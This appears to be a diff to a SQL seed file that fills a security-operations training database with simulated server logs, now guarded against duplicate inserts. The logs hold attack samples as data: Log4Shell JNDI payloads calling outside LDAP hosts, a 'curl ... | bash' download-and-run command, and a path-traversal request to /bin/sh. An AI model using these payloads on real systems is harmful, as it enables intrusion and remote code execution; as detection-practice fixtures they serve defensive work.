@@ -206,19 +206,24 @@ VALUES
  'SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5\r\nFailed password for root from 103.145.13.78 port 48212 ssh2', 'NEW')
 ON CONFLICT (alert_id) DO NOTHING;
 
--- Seed Server Logs
-INSERT INTO soc_server_logs (host_ip, log_type, status_code, request_method, request_uri, response_bytes, client_ip, raw_entry)
-VALUES
-('10.0.4.15', 'http_access', 200, 'GET', '/api/v1/search?q=test', 4820, '185.220.101.45',
- '185.220.101.45 - - [12/Sep/2026:17:40:12 +0000] "GET /api/v1/search?q=test HTTP/1.1" 200 4820 "-" "${jndi:ldap://185.220.101.45:1389/Exploit}"'),
-('10.0.4.15', 'system', NULL, NULL, NULL, NULL, '185.220.101.45',
- 'catalina.out: 2026-09-12 17:40:13 WARN org.apache.logging.log4j.core.net.JndiManager - JNDI lookup received for ldap://185.220.101.45:1389/Exploit - connecting to remote server'),
-('10.0.4.15', 'edr_process', NULL, NULL, NULL, NULL, '185.220.101.45',
- 'EDR ALERT: java (pid 1420) spawned unexpected child process /bin/sh -c "curl -s http://185.220.101.45/stage2.sh | bash"'),
-('10.0.4.22', 'http_access', 401, 'GET', '/auth/login', 52, '45.154.255.89',
- '45.154.255.89 - - [12/Sep/2026:17:10:44 +0000] "GET /auth/login HTTP/1.1" 401 52 "-" "${jndi:ldap://45.154.255.89:1389/Exploit}"'),
-('10.0.4.22', 'system', NULL, NULL, NULL, NULL, '45.154.255.89',
- 'uvicorn.access: INFO 10.0.4.22:443 - Invalid authorization token format. No outbound socket connections created.'),
-('10.0.4.88', 'http_access', 200, 'POST', '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh', 142, '194.26.29.112',
- '194.26.29.112 - - [12/Sep/2026:17:25:01 +0000] "POST /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1" 200 142 "-" "curl/7.68.0"')
-ON CONFLICT DO NOTHING;
+-- Seed Server Logs (guarded: only insert if table is empty to avoid duplicates)
+DO $$
+BEGIN
+  IF NOT EXISTS (SELECT 1 FROM soc_server_logs LIMIT 1) THEN
+    INSERT INTO soc_server_logs (host_ip, log_type, status_code, request_method, request_uri, response_bytes, client_ip, raw_entry)
+    VALUES
+    ('10.0.4.15', 'http_access', 200, 'GET', '/api/v1/search?q=test', 4820, '185.220.101.45',
+     '185.220.101.45 - - [12/Sep/2026:17:40:12 +0000] "GET /api/v1/search?q=test HTTP/1.1" 200 4820 "-" "${jndi:ldap://185.220.101.45:1389/Exploit}"'),
+    ('10.0.4.15', 'system', NULL, NULL, NULL, NULL, '185.220.101.45',
+     'catalina.out: 2026-09-12 17:40:13 WARN org.apache.logging.log4j.core.net.JndiManager - JNDI lookup received for ldap://185.220.101.45:1389/Exploit - connecting to remote server'),
+    ('10.0.4.15', 'edr_process', NULL, NULL, NULL, NULL, '185.220.101.45',
+     'EDR ALERT: java (pid 1420) spawned unexpected child process /bin/sh -c "curl -s http://185.220.101.45/stage2.sh | bash"'),
+    ('10.0.4.22', 'http_access', 401, 'GET', '/auth/login', 52, '45.154.255.89',
+     '45.154.255.89 - - [12/Sep/2026:17:10:44 +0000] "GET /auth/login HTTP/1.1" 401 52 "-" "${jndi:ldap://45.154.255.89:1389/Exploit}"'),
+    ('10.0.4.22', 'system', NULL, NULL, NULL, NULL, '45.154.255.89',
+     'uvicorn.access: INFO 10.0.4.22:443 - Invalid authorization token format. No outbound socket connections created.'),
+    ('10.0.4.88', 'http_access', 200, 'POST', '/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh', 142, '194.26.29.112',
+     '194.26.29.112 - - [12/Sep/2026:17:25:01 +0000] "POST /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1" 200 142 "-" "curl/7.68.0"');
+  END IF;
+END $$;
+
